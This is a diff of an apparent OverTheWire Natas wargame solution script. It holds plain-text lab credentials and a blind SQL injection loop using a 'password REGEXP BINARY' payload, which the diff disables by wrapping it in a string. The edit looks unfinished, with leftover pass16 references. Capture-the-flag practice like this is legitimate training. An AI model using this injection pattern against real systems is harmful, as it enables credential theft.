@@ -1,18 +1,21 @@
 #!/bin/python3
-# Password per natas16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 import requests
 import re
 
-user = 'natas15'
-password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
+user = 'natas17'
+password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
 url = 'http://%s.natas.labs.overthewire.org/' % user
 
-
 sessione = requests.Session()
+obj = {'username': 'natas18'}
+get = sessione.get(url, data=obj, auth=(user, password))
 
+print(get.text)
+
+'''
 query = 'natas16" and password REGEXP BINARY "^'
 letter = '{}'
-pass16 = ''
+pass18 = ''
 
 while True:
 
@@ -32,3 +35,6 @@ while True:
         break
 
 print(pass16)
+
+print(get.text)
+'''
